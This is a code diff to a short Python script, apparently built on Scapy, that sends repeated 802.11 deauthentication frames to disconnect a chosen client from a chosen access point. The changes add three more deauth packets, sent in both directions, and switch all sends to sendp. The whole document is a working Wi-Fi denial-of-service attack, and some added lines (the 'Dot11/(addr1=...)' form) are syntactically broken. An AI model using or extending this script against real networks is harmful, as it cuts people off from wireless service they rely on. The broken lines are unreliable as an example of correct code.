@@ -20,10 +20,17 @@ conf.verb = 0
 
 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
 packet2 = Dot11/(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
+packet3 = Dot11/(addr1=bssid,addr2=client,addr3=client)/Dot11Deauth()
+packet4 = Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
+packet5 = Dot11(addr1=bssid,addr2=client,addr3=client)/Dot11Deauth()
+
 
 for n in range(int(count)):
 	sendp(packet)
-	send(packet2)
+	sendp(packet2)
+	sendp(packet3)
+	sendp(packet4)
+	sendp(packet5)
 	print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
 
 
